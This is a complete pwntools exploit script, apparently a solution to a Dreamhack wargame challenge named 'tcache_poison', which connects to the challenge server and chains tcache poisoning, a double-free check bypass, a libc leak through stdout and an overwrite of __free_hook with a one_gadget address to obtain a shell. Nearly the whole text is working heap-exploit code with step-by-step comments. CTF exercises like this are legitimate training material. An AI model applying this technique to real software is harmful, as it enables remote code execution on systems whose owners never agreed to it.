# Name: tcache_poison.py
#!/usr/bin/python3
from pwn import *
#p = process("./tcache_poison")

p = remote("host1.dreamhack.games", 13080)

e = ELF("./tcache_poison")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
def slog(symbol, addr): return success(symbol + ": " + hex(addr))
def alloc(size, data):
    p.sendlineafter("Edit\n", "1")
    p.sendlineafter(":", str(size))
    p.sendafter(":", data)
def free():
    p.sendlineafter("Edit\n", "2")
def print_chunk():
    p.sendlineafter("Edit\n", "3")
def edit(data):
    p.sendlineafter("Edit\n", "4")
    p.sendafter(":", data)
# Allocate a chunk of size 0x40
alloc(0x30, "dreamhack")
free()
# tcache[0x40]: "dreamhack"
# Bypass the DFB mitigation
edit("A"*8 + "\x00")
free()
# tcache[0x40]: "dreamhack" -> "dreamhack"
# Append the address of `stdout` to tcache[0x40]
addr_stdout = e.symbols["stdout"]
alloc(0x30, p64(addr_stdout))
# tcache[0x40]: "dreamhack" -> stdout -> _IO_2_1_stdout_ -> ...
# Leak the value of stdout
alloc(0x30, "B"*8)          # "dreamhack"
alloc(0x30, "\x60")         # stdout
# Libc leak
print_chunk()
p.recvuntil("Content: ")
stdout = u64(p.recv(6).ljust(8, b"\x00"))
lb = stdout - libc.symbols["_IO_2_1_stdout_"]
fh = lb + libc.symbols["__free_hook"]
og = lb + 0x4f432
slog("free_hook", fh)
slog("one_gadget", og)
# Overwrite the `__free_hook` with the address of one_gadget
alloc(0x40, "dreamhack")
free()
edit("C"*8 + "\x00")
free()
alloc(0x40, p64(fh))
alloc(0x40, "D"*8)
alloc(0x40, p64(og))
# Call `free()` to get shell
free()
p.interactive()
